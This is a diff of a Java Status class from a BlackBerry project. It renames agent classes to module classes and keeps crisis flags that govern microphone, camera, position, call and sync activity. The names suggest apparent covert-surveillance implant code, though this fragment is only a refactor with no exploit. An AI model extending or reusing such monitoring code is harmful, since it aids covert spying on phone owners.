@@ -15,13 +15,13 @@ import java.util.Timer;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.device.api.system.RuntimeStore;
-import blackberry.agent.CrisisAgent;
-import blackberry.agent.MicAgent;
 import blackberry.config.Globals;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.interfaces.Singleton;
+import blackberry.module.ModuleCrisis;
+import blackberry.module.ModuleMic;
 import blackberry.utils.BlockingQueueTrigger;
 
 /**
@@ -122,7 +122,7 @@ public final class Status implements Singleton {
         debug.info("set crisis: " + type);
         //#endif
 
-        final MicAgent micAgent = MicAgent.getInstance();
+        final ModuleMic micAgent = ModuleMic.getInstance();
         micAgent.crisis(crisisMic());
 
     }
@@ -147,31 +147,31 @@ public final class Status implements Singleton {
 
     public boolean crisisPosition() {
         synchronized (lockCrisis) {
-            return (isCrisis() && (crisisType & CrisisAgent.POSITION) != 0);
+            return (isCrisis() && (crisisType & ModuleCrisis.POSITION) != 0);
         }
     }
 
     public boolean crisisCamera() {
         synchronized (lockCrisis) {
-            return (isCrisis() && (crisisType & CrisisAgent.CAMERA) != 0);
+            return (isCrisis() && (crisisType & ModuleCrisis.CAMERA) != 0);
         }
     }
 
     public boolean crisisCall() {
         synchronized (lockCrisis) {
-            return (isCrisis() && (crisisType & CrisisAgent.CALL) != 0);
+            return (isCrisis() && (crisisType & ModuleCrisis.CALL) != 0);
         }
     }
 
     public boolean crisisMic() {
         synchronized (lockCrisis) {
-            return (isCrisis() && (crisisType & CrisisAgent.MIC) != 0);
+            return (isCrisis() && (crisisType & ModuleCrisis.MIC) != 0);
         }
     }
 
     public boolean crisisSync() {
         synchronized (lockCrisis) {
-            return (isCrisis() && (crisisType & CrisisAgent.SYNC) != 0);
+            return (isCrisis() && (crisisType & ModuleCrisis.SYNC) != 0);
         }
     }
 
